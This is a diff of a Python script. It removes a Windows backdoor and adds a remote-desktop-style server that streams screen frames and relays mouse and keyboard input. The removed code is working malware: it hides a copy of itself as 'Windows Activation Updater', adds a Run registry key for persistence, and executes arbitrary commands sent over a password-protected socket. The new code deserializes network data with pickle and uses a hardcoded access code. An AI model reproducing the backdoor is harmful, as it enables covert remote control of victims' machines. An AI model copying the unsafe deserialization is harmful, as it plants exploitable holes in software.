@@ -1,65 +1,129 @@
 import socket
-import os
-from threading import Thread
-from winreg import HKEY_CURRENT_USER, OpenKey, KEY_ALL_ACCESS, SetValueEx, REG_SZ, CloseKey
-import sys
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-s.bind(('0.0.0.0', 16865)) # Default port
-s.listen(5)
+import threading
+import cv2
+import pickle
+import struct
+import numpy as np
+from pynput import mouse, keyboard
 
+HOST = "0.0.0.0"
+PORT = 5050
+CODE = "123456"
 
-def duplicate(path):
-    abs_path = sys.argv[0]
-    directory = ''
-    element_list = list(path.split('\\'))
-    length = len(element_list)
-    for i in range(length):
-        if not i == length - 1:
-            directory += f'{element_list[i]}\\'
-            directory = directory.replace('%USERPROFILE%', os.environ['USERPROFILE'])
-            if not os.path.isdir(directory[0:-1]):
-                os.system(f'mkdir "{directory[0:-1]}" && attrib +h "{directory[0:-1]}"')
-    os.system(f'copy "{abs_path}" "{path}" && attrib +h "{path}"')
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.bind((HOST, PORT))
+server.listen(1)
 
+print("Server started")
+print("Code:", CODE)
 
-if not os.path.isfile(fr'{os.environ["USERPROFILE"]}\AppData\Local\Programs\Windows Activation Updater.exe'):
-    duplicate(r'%USERPROFILE%\AppData\Local\Programs\Windows Activation Updater\Windows Activation Updater.exe')
+conn, addr = server.accept()
+print("Connected:", addr)
 
-reg_name = 'Windows Activation Updater'
+data = conn.recv(1024).decode()
 
-key = OpenKey(HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0, KEY_ALL_ACCESS)
+if data != f"CONNECT {CODE}":
+    conn.send(b"REJECT")
+    conn.close()
+    exit()
 
-SetValueEx(key, reg_name, 0, REG_SZ, fr'{os.environ["USERPROFILE"]}\AppData\Local\Programs\Windows Activation Updater\Windows Activation Updater.exe')
-CloseKey(key)
+conn.send(b"ACCEPT")
 
+payload_size = struct.calcsize("Q")
+data = b""
 
-def get_commands(admin):
+def receive_screen():
+
+    global data
+
     while True:
-        try:
-            cmd = admin.recv(1024).decode()
-            output = os.popen(cmd).read()
-            admin.send(output.encode())
-            if cmd == b'':
-                admin = wait_for_master()
-        except:
-            try:
-                admin.send('[*] Error. Reconnect now.')
-            except:
-                pass
-            admin = wait_for_master()
 
+        while len(data) < payload_size:
+            packet = conn.recv(4096)
+            if not packet:
+                return
+            data += packet
 
-def wait_for_master():
-    connected = False
-    while not connected:
-        master, ip = s.accept()
-        connected = True
-        if master.recv(1024).decode() != 'Dfjg8W$G*9gjH!': # Default password
-            master.close()
-            connected = False
-    return master
+        packed_msg_size = data[:payload_size]
+        data = data[payload_size:]
+        msg_size = struct.unpack("Q", packed_msg_size)[0]
 
+        while len(data) < msg_size:
+            data += conn.recv(4096)
 
-commander = wait_for_master()
-Thread(target=get_commands, args=(commander,)).start()
+        frame_data = data[:msg_size]
+        data = data[msg_size:]
+
+        frame = pickle.loads(frame_data)
+        frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
+
+        cv2.imshow("Remote Screen", frame)
+
+        if cv2.waitKey(1) == 27:
+            break
+
+def send_mouse(x,y,button,pressed):
+
+    msg = f"MOUSE {x} {y} {button} {pressed}"
+    conn.send(msg.encode())
+
+def on_move(x,y):
+    conn.send(f"MOVE {x} {y}".encode())
+
+def on_click(x,y,button,pressed):
+    send_mouse(x,y,str(button),pressed)
+
+def on_scroll(x,y,dx,dy):
+    conn.send(f"SCROLL {dx} {dy}".encode())
+
+def on_press(key):
+
+    try:
+        conn.send(f"KEY {key.char}".encode())
+    except:
+        conn.send(f"KEY {key}".encode())
+
+def send_file():
+
+    path = input("File path to send: ")
+
+    try:
+        with open(path,"rb") as f:
+            data = f.read()
+
+        header = f"FILE {len(data)}".encode()
+        conn.send(header)
+
+        conn.sendall(data)
+
+        print("File sent")
+
+    except:
+        print("Failed sending file")
+
+screen_thread = threading.Thread(target=receive_screen)
+screen_thread.start()
+
+mouse_listener = mouse.Listener(
+    on_move=on_move,
+    on_click=on_click,
+    on_scroll=on_scroll)
+
+keyboard_listener = keyboard.Listener(on_press=on_press)
+
+mouse_listener.start()
+keyboard_listener.start()
+
+while True:
+
+    cmd = input("server command (/file /exit): ")
+
+    if cmd == "/file":
+        send_file()
+
+    if cmd == "/exit":
+        conn.send(b"EXIT")
+        break
+
+conn.close()
+server.close()
